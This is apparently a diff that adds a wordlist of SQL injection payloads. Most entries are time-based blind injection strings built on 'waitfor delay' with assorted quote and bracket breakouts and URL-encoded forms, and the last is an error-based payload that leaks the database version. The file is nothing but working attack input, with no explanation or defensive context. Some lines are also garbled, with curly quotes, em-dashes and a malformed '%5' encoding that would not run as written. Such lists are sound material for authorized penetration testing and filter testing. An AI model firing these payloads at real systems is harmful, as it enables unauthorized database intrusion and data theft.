@@ -1,0 +1,23 @@
+'));waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+;waitfor delay '00:00:05'
+;waitfor delay '00:00:05'#
+;waitfor delay '00:00:05'--
+;waitfor delay ‘0:0:5’ —-
+‘;WAITFOR DELAY ‘0:0:5’ —-
+“;waitfor delay ‘0:0:5’ —-
+‘);waitfor delay ‘0:0:5’ —-
+“);waitfor delay ‘0:0:5’ —-
+“));waitfor delay ‘0:0:5’ —-
+‘));waitfor delay ‘0:0:5’ —-
+“));waitfor delay ‘0:0:5’ —-
+“);waitfor delay ‘0:0:5’ —-
+';%20waitfor%20delay%20'0:0:6'%20--%20
+‘;%5waitfor%5delay%5’0:0:5'%5 -- %5
+132'; waitfor delay '0:0:6' -- 
+'>;WAITFOR DELAY '00:00:5'--
+' WAITFOR DELAY ‘0:0:5’ —-
+' AND 1=CAST((SELECT version()) AS int) --
